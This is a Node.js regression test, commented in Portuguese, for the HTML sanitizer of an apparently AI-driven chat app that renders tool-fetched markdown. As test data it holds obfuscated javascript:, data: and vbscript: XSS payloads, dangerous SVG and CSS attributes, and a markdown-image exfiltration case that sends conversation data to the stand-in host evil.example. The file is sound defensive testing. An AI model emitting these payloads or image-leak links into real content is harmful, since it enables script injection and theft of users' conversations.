// ══════════════════════════════════════════════════════════════════════════
// Testa o SANEAMENTO do app (app/iald.js, função sanear) — 14/09/2026 (noite).
//
// POR QUE EXISTE: a revisão de segurança (BAIXO 2) mostrou que o saneamento antigo só
// comparava `startsWith('javascript:')` no valor cru do atributo. Passavam:
//   - href="jav&#x09;ascript:..."  (o parser entrega "jav\tascript:"; o navegador tira o
//     TAB e abre javascript:) — um toque no link levaria o token do app;
//   - xlink:href, formaction, <base>, style com url(javascript:), data:text/html.
// A fonte é conteúdo de ferramenta (fetch_url, search_web) que entra no markdown.
//
// COMO: extrai do iald.js o bloco entre "── SANEAMENTO (início) ──" e "── SANEAMENTO
// (fim) ──" (ou, num arquivo antigo sem marcadores, só a função sanear) e o executa em
// node sobre um DOM mínimo. Os valores de atributo são os que o PARSER HTML entrega ao
// DOM (entidades já decodificadas), com o HTML cru ao lado, em comentário. Cada caso
// foi escolhido para FALHAR no código antigo: rode
//   node tests/test_app_sanear.mjs app/iald.js.bak_20260914_192449
// para ver as falhas do antes. Sem argumento, testa app/iald.js.
//
// RODADA 3 (14/09/2026, noite) — cada caso novo também FALHA no iald.js anterior:
//   - N3: tel: fica (CVV 188, SAMU 192), sem abrir a porta a javascript:/data:;
//   - resíduo do item 8 da revisão de segurança: imagem e mídia EXTERNAS (<img src>, <svg image>,
//     markdown de imagem, poster, feImage, fill="url(...)") não carregam sozinhas — viram o link
//     "imagem: domínio"; data: e blob: locais continuam; endereço relativo não carrega;
//   - o index.html traz a segunda trava (CSP img-src/media-src 'self' data: blob:).
//   node tests/test_app_sanear.mjs <cópia antiga>/iald.js   mostra as falhas do antes.
// Não usa rede, não abre navegador, não grava arquivo; lê o iald.js, o index.html ao lado dele
// e o marked embarcado (vendor/ ao lado), só para confirmar que markdown de imagem vira <img>.
// ══════════════════════════════════════════════════════════════════════════
import { readFileSync, existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const AQUI = path.dirname(fileURLToPath(import.meta.url));
const ALVO = path.resolve(process.argv[2] || path.join(AQUI, '..', 'app', 'iald.js'));
const fonte = readFileSync(ALVO, 'utf8');

let ok = 0, falhas = 0;
function checa(nome, cond, detalhe) {
  if (cond) { ok++; console.log(`  [OK]    ${nome}`); }
  else { falhas++; console.log(`  [FALHA] ${nome}${detalhe ? '  ' + detalhe : ''}`); }
}

console.log('='.repeat(70));
console.log(' SANEAMENTO DO APP — ' + ALVO);
console.log('='.repeat(70));

// ── extração ──
function extrairFuncao(texto, nome) {
  const i = texto.indexOf('function ' + nome + '(');
  if (i < 0) return '';
  let j = texto.indexOf('{', i), nivel = 0;
  for (let k = j; k < texto.length; k++) {
    if (texto[k] === '{') nivel++;
    else if (texto[k] === '}') { nivel--; if (nivel === 0) return texto.slice(i, k + 1); }
  }
  return '';
}
const INI = '// ── SANEAMENTO (início) ──', FIM = '// ── SANEAMENTO (fim) ──';
let bloco = '';
if (fonte.includes(INI) && fonte.includes(FIM)) bloco = fonte.slice(fonte.indexOf(INI), fonte.indexOf(FIM));
else bloco = extrairFuncao(fonte, 'sanear');
checa('bloco de saneamento encontrado no iald.js', !!bloco);
const nomes = ['sanear', 'enderecoPermitido', 'estiloPerigoso', 'decodificarEntidades', 'enderecoExterno', 'recursoLocal'];
const F = new Function('URL', bloco + '\nreturn {' + nomes.map((n) => `${n}: (typeof ${n} === 'function') ? ${n} : null`).join(',') + '};')(URL);
checa('função sanear existe', typeof F.sanear === 'function');

// ── DOM mínimo: só o que sanear usa ──
const DOC = { createElement: (tag) => new No(tag) };
class No {
  constructor(tag, atributos, filhos) {
    this.localName = tag.toLowerCase();
    this.nodeName = tag.toUpperCase();
    this.attributes = Object.entries(atributos || {}).map(([name, value]) => ({ name, value: String(value) }));
    this.filhos = [];
    this.pai = null;
    this.texto = '';
    for (const f of (filhos || [])) this.anexar(f);
  }
  get parentNode() { return this.pai; }
  get ownerDocument() { return DOC; }
  get textContent() { return this.texto + this.filhos.map((f) => f.textContent).join(''); }
  set textContent(v) { this.texto = String(v); for (const f of this.filhos) f.pai = null; this.filhos = []; }
  anexar(f) { f.pai = this; this.filhos.push(f); return f; }
  remove() { if (this.pai) { this.pai.filhos = this.pai.filhos.filter((x) => x !== this); this.pai = null; } }
  after(...nos) {
    const p = this.pai; if (!p) return;
    let i = p.filhos.indexOf(this);
    for (const no of nos) { no.remove(); no.pai = p; p.filhos.splice(++i, 0, no); }
  }
  replaceWith(...nos) { if (!this.pai) return; this.after(...nos); this.remove(); }
  getAttribute(n) { const a = this.attributes.find((x) => x.name.toLowerCase() === n.toLowerCase()); return a ? a.value : null; }
  hasAttribute(n) { return this.getAttribute(n) !== null; }
  setAttribute(n, v) { const a = this.attributes.find((x) => x.name.toLowerCase() === n.toLowerCase()); if (a) a.value = String(v); else this.attributes.push({ name: n, value: String(v) }); }
  removeAttribute(n) { this.attributes = this.attributes.filter((x) => x.name.toLowerCase() !== n.toLowerCase()); }
  descendentes() { const r = []; for (const f of this.filhos) { r.push(f); r.push(...f.descendentes()); } return r; }
  querySelectorAll(sel) {
    const partes = sel.split(',').map((s) => s.trim());
    return this.descendentes().filter((n) => partes.some((p) => {
      if (p === '*') return true;
      const m = /^([a-z0-9]+)(?:\[([a-z:-]+)\])?$/i.exec(p);
      if (!m) throw new Error('seletor não suportado pelo DOM mínimo: ' + p);
      return n.localName === m[1].toLowerCase() && (!m[2] || n.hasAttribute(m[2]));
    }));
  }
  forEach() { throw new Error('não é lista'); }
}
const raizCom = (...filhos) => new No('div', {}, filhos);
const achar = (raiz, tag) => raiz.descendentes().filter((n) => n.localName === tag);

function rodar(raiz) {
  try { F.sanear(raiz); return ''; } catch (e) { return String(e && e.message || e); }
}

// ── 1. endereços: só http, https, mailto ──
console.log('\n1. endereços perigosos saem (valor como o parser entrega)');
const perigosos = [
  // [rótulo, tag, atributo, valor entregue ao DOM]
  ['href="jav&#x09;ascript:" (payload do revisor)', 'a', 'href', 'jav\tascript:alert(1)'],
  ['href="jav&#x09;ascript:" cru, entidade não decodificada', 'a', 'href', 'jav&#x09;ascript:alert(1)'],
  ['href="&amp;#x6A;avascript:" (entidade dupla)', 'a', 'href', '&#x6A;avascript:alert(1)'],
  ['href com controle C0 na frente (&#14;javascript:)', 'a', 'href', '\x0Ejavascript:alert(1)'],
  ['href com quebra no meio (java&#10;script:)', 'a', 'href', 'java\nscript:alert(1)'],
  ['href="data:text/html,<script>" (payload do revisor)', 'a', 'href', 'data:text/html,<script>alert(1)</script>'],
  ['href="vbscript:"', 'a', 'href', 'vbscript:msgbox(1)'],
  ['href="javascript&colon;" cru', 'a', 'href', 'javascript&colon;alert(1)'],
  ['img src="data:image/svg+xml,<svg onload>"', 'img', 'src', 'data:image/svg+xml,<svg onload=alert(1)>'],
  ['math href="javascript:"', 'math', 'href', 'javascript:alert(1)'],
  ['video poster="javascript:"', 'video', 'poster', 'javascript:alert(1)'],
];
for (const [rotulo, tag, at, valor] of perigosos) {
  const alvo = new No(tag, { [at]: valor });
  const erro = rodar(raizCom(alvo));
  checa(rotulo, !erro && !alvo.hasAttribute(at), erro || `sobrou ${at}=${JSON.stringify(alvo.getAttribute(at))}`);
}

console.log('\n2. endereços legítimos ficam');
const legitimos = [
  ['https', 'a', 'href', 'https://iald.ia.br/privacidade.html'],
  ['http', 'a', 'href', 'http://exemplo.com/a?b=1&c=2'],
  ['mailto', 'a', 'href', 'mailto:contato@iald.ia.br'],
  ['âncora relativa', 'a', 'href', '#secao'],
  // N3 (rodada 3): o link de telefone numa resposta de acolhimento tem de ser tocável
  ['tel: CVV 188', 'a', 'href', 'tel:188'],
  ['tel: SAMU 192', 'a', 'href', 'tel:192'],
  // data: e blob: não saem do aparelho: continuam carregando (rodada 3)
  ['imagem data:image/png', 'img', 'src', 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='],
  ['imagem blob: do próprio app', 'img', 'src', 'blob:https://localhost/0b5c7a8e-1f1e-4c1a-9d1b-3c2b7a1e5f00'],
];
for (const [rotulo, tag, at, valor] of legitimos) {
  const alvo = new No(tag, { [at]: valor });
  const erro = rodar(raizCom(alvo));
  checa(`mantém ${rotulo}`, !erro && alvo.getAttribute(at) === valor, erro || `ficou ${JSON.stringify(alvo.getAttribute(at))}`);
}
{
  const a = new No('a', { href: 'https://iald.ia.br' });
  rodar(raizCom(a));
  checa('link abre fora (target=_blank, rel=noopener noreferrer)', a.getAttribute('target') === '_blank' && /noopener/.test(a.getAttribute('rel') || ''));
  const t = new No('a', { href: 'tel:188' });
  rodar(raizCom(t));
  checa('link tel: abre fora como os outros (target=_blank, rel=noopener)', t.getAttribute('target') === '_blank' && /noopener/.test(t.getAttribute('rel') || ''));
  const js = new No('a', { href: 'javascript:tel=188' });
  rodar(raizCom(js));
  checa('liberar tel: não libera "javascript:tel=188"', !js.hasAttribute('href'), JSON.stringify(js.getAttribute('href')));
}

// ── 3. atributos que executam ou reescrevem destino ──
console.log('\n3. atributos perigosos saem');
{
  const svgA = new No('a', { 'xlink:href': 'javascript:alert(1)' }, [new No('text')]);
  rodar(raizCom(new No('svg', {}, [svgA])));
  checa('xlink:href sai (payload do revisor)', !svgA.hasAttribute('xlink:href'));

  const botao = new No('button', { formaction: 'javascript:alert(1)' });
  rodar(raizCom(botao));
  checa('formaction sai', !botao.hasAttribute('formaction'));

  const img = new No('img', { src: 'x', onerror: 'alert(1)', ONLOAD: 'alert(2)' });
  rodar(raizCom(img));
  checa('on* sai (inclusive em maiúsculas)', !img.hasAttribute('onerror') && !img.hasAttribute('onload'));

  const estilo = new No('div', { style: 'background:url(javascript:alert(1))' });
  rodar(raizCom(estilo));
  checa('style com url(javascript:) sai', !estilo.hasAttribute('style'));

  const escapado = new No('div', { style: 'background:u\\72l(javascript:alert(1))' });
  rodar(raizCom(escapado));
  checa('style com url escrito em escape de CSS (u\\72l) sai', !escapado.hasAttribute('style'));

  const katex = new No('span', { class: 'strut', style: 'height:0.6444em;vertical-align:-0.0833em;' });
  rodar(raizCom(katex));
  checa('style de medida do KaTeX fica', katex.getAttribute('style') === 'height:0.6444em;vertical-align:-0.0833em;');

  const sequestro = new No('textarea', { id: 'entrada', name: 'entrada' });
  rodar(raizCom(sequestro));
  checa('id/name saem (a resposta não sequestra #entrada do app)', !sequestro.hasAttribute('id') && !sequestro.hasAttribute('name'));
}

// ── 4. elementos que carregam, executam ou mudam a base ──
console.log('\n4. elementos perigosos saem inteiros');
for (const [tag, at] of [
  ['base', { href: 'javascript:alert(1)//' }],
  ['iframe', { srcdoc: '<script>alert(1)</script>' }],
  ['form', { action: 'javascript:alert(1)' }],
  ['object', { data: 'javascript:alert(1)' }],
  ['script', {}],
  ['meta', { 'http-equiv': 'refresh', content: '0;url=javascript:alert(1)' }],
  ['animate', { attributeName: 'href', to: 'javascript:alert(1)' }],
  ['set', { attributeName: 'href', to: 'javascript:alert(1)' }],
  ['use', { href: 'data:image/svg+xml,<svg id="x"/>#x' }],
  ['foreignObject', {}],
]) {
  const raiz = raizCom(new No('svg', {}, [new No(tag, at)]), new No(tag, at));
  const erro = rodar(raiz);
  checa(`<${tag}> sai`, !erro && achar(raiz, tag.toLowerCase()).length === 0, erro);
}

// ── 5. funções puras (só no código novo) ──
console.log('\n5. regras puras');
if (F.enderecoPermitido && F.decodificarEntidades && F.estiloPerigoso) {
  checa('decodifica &#x6A; e &#106;', F.decodificarEntidades('&#x6A;&#106;') === 'jj');
  checa('decodifica &colon; e &Tab;', F.decodificarEntidades('a&colon;b&Tab;c') === 'a:b\tc');
  checa('enderecoPermitido recusa o payload literal do revisor', F.enderecoPermitido('jav&#x09;ascript:') === false);
  checa('enderecoPermitido recusa vazio', F.enderecoPermitido('   ') === false);
  checa('enderecoPermitido aceita https', F.enderecoPermitido('https://github.com/rotolimiguel-iald/the_boundary') === true);
  checa('estiloPerigoso: expression() é perigoso', F.estiloPerigoso('width: expression(alert(1))') === true);
  checa('estiloPerigoso: cor comum não é', F.estiloPerigoso('color:#C5961A') === false);
  checa('enderecoPermitido aceita tel:188', F.enderecoPermitido('tel:188') === true);
} else {
  checa('funções puras enderecoPermitido/estiloPerigoso/decodificarEntidades existem', false, 'ausentes neste arquivo');
}
if (F.enderecoExterno && F.recursoLocal) {
  const ext = (v) => { const u = F.enderecoExterno(v); return u ? u.href : null; };
  checa('enderecoExterno: https absoluto', ext('https://evil.example/x.png?c=1') === 'https://evil.example/x.png?c=1');
  checa('enderecoExterno: "//host" (sem esquema) é externo', ext('//evil.example/x.png') === 'https://evil.example/x.png');
  checa('enderecoExterno: barra invertida no lugar da barra é externo', ext(String.raw`\\evil.example\x.png`) === 'https://evil.example/x.png');
  checa('enderecoExterno: relativo ("x", "/logout") não é', ext('x') === null && ext('/logout') === null);
  checa('enderecoExterno: data:, javascript: e vazio não são', ext('data:image/png;base64,AA==') === null && ext('javascript:alert(1)') === null && ext('  ') === null);
  checa('recursoLocal: data:image/png, data:image/jpeg e blob: sim', F.recursoLocal('data:image/png;base64,AA==') && F.recursoLocal(' data:image/jpeg;base64,AA==') && F.recursoLocal('blob:https://localhost/1'));
  checa('recursoLocal: data:image/svg+xml, data:text/html e https não', !F.recursoLocal('data:image/svg+xml,<svg/>') && !F.recursoLocal('data:text/html,x') && !F.recursoLocal('https://x/y.png'));
} else {
  checa('funções puras enderecoExterno/recursoLocal existem (rodada 3)', false, 'ausentes neste arquivo');
}

// ── 6. a leitura do markdown é inerte ──
console.log('\n6. o HTML é lido num <template> e saneado antes de entrar no documento');
{
  const rm = extrairFuncao(fonte, 'renderMarkdown');
  const iMolde = rm.indexOf("document.createElement('template')");
  const iSanear = rm.indexOf('sanear(molde.content)');
  const iAnexar = rm.indexOf('appendChild(molde.content)');
  checa('renderMarkdown usa <template>', iMolde > 0);
  checa('saneia antes de anexar ao documento', iSanear > iMolde && iAnexar > iSanear);
}

// ── 7. recurso externo não carrega sozinho (rodada 3) ──
console.log('\n7. imagem e mídia externas viram link "imagem: domínio"; nada é pedido sem toque');
const linksDe = (raiz) => raiz.descendentes().filter((n) => n.localName === 'a' && /recurso-externo/.test(n.getAttribute('class') || ''));
const carregadores = (raiz) => raiz.descendentes().filter((n) => ['img', 'image', 'feimage', 'video', 'audio', 'source', 'track', 'input'].includes(n.localName)
  && (n.hasAttribute('src') || n.hasAttribute('href') || n.hasAttribute('poster')));
{
  // <img src> externo (o canal de exfiltração: a conversa vai no endereço)
  const img = new No('img', { src: 'https://evil.example/pixel.png?conversa=SEGREDO', alt: 'x' });
  const p = new No('p', {}, [img]);
  const raiz = raizCom(p);
  const erro = rodar(raiz);
  const ls = linksDe(raiz);
  checa('<img src="https://…?conversa=SEGREDO"> não fica no documento', !erro && achar(raiz, 'img').length === 0, erro);
  checa('no lugar dele, UM link "imagem: evil.example" dentro do mesmo parágrafo',
    ls.length === 1 && ls[0].textContent === 'imagem: evil.example' && ls[0].pai === p, JSON.stringify(ls.map((l) => l.textContent)));
  checa('o link aponta para o endereço, abre fora e mostra o endereço inteiro no title',
    !!ls[0] && ls[0].getAttribute('href') === 'https://evil.example/pixel.png?conversa=SEGREDO'
    && ls[0].getAttribute('target') === '_blank' && /noopener/.test(ls[0].getAttribute('rel') || '')
    && ls[0].getAttribute('title') === 'https://evil.example/pixel.png?conversa=SEGREDO');
}
{
  // markdown de imagem: o marked embarcado entrega <p><img src alt></p> — o mesmo caminho acima
  const vendor = path.join(path.dirname(ALVO), 'vendor', 'marked.min.js');
  if (existsSync(vendor)) {
    const modulo = { exports: {} }, janela = {};
    new Function('module', 'exports', 'window', 'self', 'globalThis', readFileSync(vendor, 'utf8'))(modulo, modulo.exports, janela, janela, janela);
    const mk = modulo.exports.marked || janela.marked;
    const html = mk.parse('![x](https://evil.example/i.png?conversa=SEGREDO)', { breaks: true, gfm: true });
    checa('markdown de imagem vira <img src="https://…"> no marked embarcado (coberto pela regra do <img>)', /<img src="https:\/\/evil\.example\/i\.png\?conversa=SEGREDO"/.test(html), html.trim());
  } else {
    checa('marked embarcado encontrado ao lado do iald.js', false, vendor);
  }
}
{
  // <svg><image href> externo: sai, e o link vai para DEPOIS do <svg> (link dentro de svg não aparece)
  const image = new No('image', { href: 'https://evil.example/s.png' });
  const svgEl = new No('svg', {}, [image]);
  const raiz = raizCom(svgEl);
  rodar(raiz);
  const ls = linksDe(raiz);
  checa('<svg><image href="https://…"> sai', achar(raiz, 'image').length === 0);
  checa('link "imagem: evil.example" logo depois do <svg>', ls.length === 1 && raiz.filhos.indexOf(ls[0]) === raiz.filhos.indexOf(svgEl) + 1, JSON.stringify(raiz.filhos.map((f) => f.localName)));
}
{
  const fe = new No('feImage', { href: 'https://evil.example/f.png' });
  const raiz = raizCom(new No('svg', {}, [new No('filter', {}, [fe])]));
  rodar(raiz);
  checa('<feImage href="https://…"> sai e vira link', achar(raiz, 'feimage').length === 0 && linksDe(raiz).length === 1);
  const rect = new No('rect', { fill: 'url(https://evil.example/p.svg#g)', filter: 'url(#local)' });
  rodar(raizCom(new No('svg', {}, [rect])));
  checa('atributo de apresentação com url() sai (fill, filter)', !rect.hasAttribute('fill') && !rect.hasAttribute('filter'));
  const grad = new No('linearGradient', { href: 'https://evil.example/g.svg#g' });
  const frag = new No('linearGradient', { href: '#local' });
  rodar(raizCom(new No('svg', {}, [grad, frag])));
  checa('href de SVG fora de <a>: externo sai, fragmento "#local" fica', !grad.hasAttribute('href') && frag.getAttribute('href') === '#local');
}
{
  const video = new No('video', { poster: 'https://evil.example/p.png', controls: '' }, [new No('source', { src: 'https://cdn.evil.example/v.mp4' })]);
  const raiz = raizCom(video);
  rodar(raiz);
  const textos = linksDe(raiz).map((l) => l.textContent).sort();
  checa('<video poster> e <source src> externos: nada carregador sobra', carregadores(raiz).length === 0 && achar(raiz, 'video').length === 0, JSON.stringify(raiz.filhos.map((f) => f.localName)));
  checa('viram "imagem: evil.example" e "mídia: cdn.evil.example"', JSON.stringify(textos) === JSON.stringify(['imagem: evil.example', 'mídia: cdn.evil.example']), JSON.stringify(textos));
}
{
  const audio = new No('audio', { src: '//evil.example/a.mp3' });
  const raiz = raizCom(audio);
  rodar(raiz);
  checa('<audio src="//host"> (sem esquema) também vira link', achar(raiz, 'audio').length === 0 && linksDe(raiz).length === 1);
  const botao = new No('input', { type: 'image', src: 'https://evil.example/b.png' });
  const caixa = new No('input', { type: 'checkbox', disabled: '' });
  const r2 = raizCom(botao, caixa);
  rodar(r2);
  checa('<input type=image src> externo vira link; <input type=checkbox> (lista de tarefas) fica', achar(r2, 'input').length === 1 && achar(r2, 'input')[0] === caixa && linksDe(r2).length === 1);
}
{
  const img = new No('img', { src: '/logout' });
  const img2 = new No('img', { src: 'x', onerror: 'alert(13)' });
  const raiz = raizCom(img, img2);
  rodar(raiz);
  checa('<img src="/logout"> e <img src="x"> (relativos: sessão do próprio servidor) não carregam nem viram link', achar(raiz, 'img').length === 0 && linksDe(raiz).length === 0);
}
{
  const img = new No('img', { src: 'https://evil.example/i.png' });
  const a = new No('a', { href: 'https://iald.ia.br/figura' }, [img]);
  const raiz = raizCom(a);
  rodar(raiz);
  const spans = raiz.descendentes().filter((n) => n.localName === 'span' && /recurso-externo/.test(n.getAttribute('class') || ''));
  checa('imagem externa dentro de link: sai, e o aviso é texto (sem link dentro de link)', achar(raiz, 'img').length === 0 && spans.length === 1 && spans[0].textContent === 'imagem: evil.example' && a.getAttribute('href') === 'https://iald.ia.br/figura');
}
{
  const local = new No('img', { src: 'data:image/png;base64,AA==' });
  const raiz = raizCom(local);
  rodar(raiz);
  checa('imagem data: local continua como imagem (sem link)', achar(raiz, 'img').length === 1 && linksDe(raiz).length === 0);
}

// ── 8. a segunda trava no index.html (rodada 3) ──
console.log('\n8. index.html: CSP de imagem e mídia; sem pré-resolução de DNS');
{
  const indice = path.join(path.dirname(ALVO), 'index.html');
  const html = existsSync(indice) ? readFileSync(indice, 'utf8') : '';
  const csp = (/<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]*)"/i.exec(html) || [])[1] || '';
  const diretiva = (nome) => ((new RegExp('(?:^|;)\\s*' + nome + '\\s+([^;]*)').exec(csp) || [])[1] || '').trim().split(/\s+/).sort().join(' ');
  checa("CSP img-src = 'self' data: blob:", diretiva('img-src') === "'self' blob: data:", csp || '(sem CSP)');
  checa("CSP media-src = 'self' data: blob:", diretiva('media-src') === "'self' blob: data:", csp || '(sem CSP)');
  checa('CSP não restringe script nem estilo (a reserva da CDN continua)', !!csp && !/script-src|style-src|default-src/.test(csp), csp || '(sem CSP)');
  checa('x-dns-prefetch-control off', /<meta\s+http-equiv="x-dns-prefetch-control"\s+content="off">/i.test(html));
}

console.log(`\n${'='.repeat(70)}\nRESULTADO: ${ok} OK, ${falhas} falhas`);
process.exit(falhas ? 1 : 0);
